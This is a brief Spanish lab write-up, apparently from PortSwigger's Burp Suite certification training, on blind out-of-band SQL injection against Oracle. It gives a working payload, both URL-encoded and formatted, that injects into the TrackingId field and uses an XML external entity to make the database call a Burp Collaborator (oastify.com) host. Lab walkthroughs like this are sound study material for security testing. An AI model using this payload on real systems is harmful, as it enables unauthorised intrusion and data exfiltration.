#BSCP #SQLinjection #Blind #Out-Of-Band #Oracle 

En este laboratorio se nos pide conseguir una consulta SQL fuera de banda, hacia el DNS de Burpsuite Collaborator.
Deberemos de introducir un Payload sobre el campo `TackingId` que desencadene una peticion DNS, en este caso antes se habran probado diferentes tipos de inyecciones como el SQLi tipico añadiendo una `'`, un Error-Based, Blind Boolean-Based y Blind TIme-Based.

Al no funcionar ninguna de estas probaremos directamente a realizar un Out-Of-Band, en este caso va URL encodeado
```sql
'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//rhc4p9gtkus3wp5f46wsq31gg7myaqyf.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--
```

```sql
'+UNION SELECT EXTRACTVALUE(
    xmltype(
        '<?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE root [
            <!ENTITY % remote SYSTEM "http://rhc4p9gtkus3wp5f46wsq31gg7myaqyf.oastify.com/">
            %remote;
        ]>'
    ),
    '/l'
)
FROM dual--
```
